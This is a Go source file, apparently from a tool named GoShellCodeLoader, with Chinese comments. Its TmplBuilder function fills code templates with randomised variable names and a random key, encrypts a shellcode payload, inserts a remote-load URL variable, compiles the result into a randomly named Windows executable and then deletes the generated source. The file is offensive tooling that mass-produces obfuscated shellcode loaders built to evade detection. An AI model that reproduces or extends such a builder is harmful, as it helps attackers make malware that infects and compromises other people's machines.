package compileutils

import (
	"GoShellCodeLoader/Utils"
	"bytes"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"text/template"
	"time"
)

func TmplBuilder(tmplDir, compilationDir string) error {
	// 读取文件夹内存在的模板文件
	tmplFiles, err := GetTmplFiles(tmplDir)
	if err != nil {
		return fmt.Errorf("failed to get tmpl files: %s", err)
	}

	// 逐一读取模板文件内容
	for _, tmplFile := range tmplFiles {
		templateContent, err := os.ReadFile(tmplFile)
		if err != nil {
			return fmt.Errorf("failed to read the tmplfile: %s", err)
		}

		// 创建模板对象
		tmpl, err := template.New("codeTmpl").Parse(string(templateContent))
		if err != nil {
			return fmt.Errorf("failed to create the tmplspace: %s", err)
		}

		// 随机 seed
		random := rand.New(rand.NewSource(time.Now().UnixNano()))

		// keyName: 保存key的变量名
		// keyValue: 随机生成的[]byte，也就是key的值
		keyName := Utils.RandomStrings(8, random)
		keyValue := Utils.RandomStrings(16, random)

		// encrypt: 保存加密内容的变量名
		encrypt := Utils.RandomStrings(9, random)
		// decrypt: 保存解密内容的变量名
		decrypt := Utils.RandomStrings(9, random)

		// fileName: 生成加密文件的名称
		fileName := Utils.RandomStrings(6, random)
		// fileData: 读取加密文件后保存的变量名
		fileData := Utils.RandomStrings(6, random)

		// payload: 保存加密shellcode的变量名
		//saveName := fileName + ".txt"
		payload, err := EncWriter(tmplDir, fileName, []byte(keyValue))
		if err != nil {
			return fmt.Errorf("failed to encrypt payload: %s", err)
		}

		// url: 保存远程加载的地址的变量名
		url := Utils.RandomStrings(8, random)

		var tpl bytes.Buffer
		err = tmpl.Execute(&tpl, map[string]interface{}{
			"keyName":  keyName,
			"keyValue": keyValue,
			"encrypt":  encrypt,
			"fileName": fileName,
			"fileData": fileData,
			"decrypt":  decrypt,
			"payload":  payload,
			"url":      url,
		})
		if err != nil {
			return fmt.Errorf("failed to render template: %s", err)
		}

		// 随机Go文件名
		goFileName := fmt.Sprintf("%s.go", Utils.RandomStrings(16, random))
		// 保存Go文件的路径
		goFilePath := filepath.Join(compilationDir, goFileName)
		// 渲染模板输出Go文件
		err = os.WriteFile(goFilePath, tpl.Bytes(), 0644)
		if err != nil {
			return fmt.Errorf("failed to write Go file: %s", err)
		}

		// 编译后的exe文件随机命名
		exeFileName := fmt.Sprintf("%s.exe", strings.TrimSuffix(goFileName, ".go"))
		// 指定Go文件编译后的保存的名称和路径
		exeFilePath := filepath.Join(compilationDir, exeFileName)
		// 编译
		err = ExeBuilderCmdStartAndWait(goFilePath, exeFilePath)
		if err != nil {
			return fmt.Errorf("failed to compile GO file: %s", err)
		}

		// 删除生成的Go文件
		err = os.Remove(goFilePath)
		if err != nil {
			return fmt.Errorf("delete GO file failed: %s", err)
		}

	}

	return nil
}
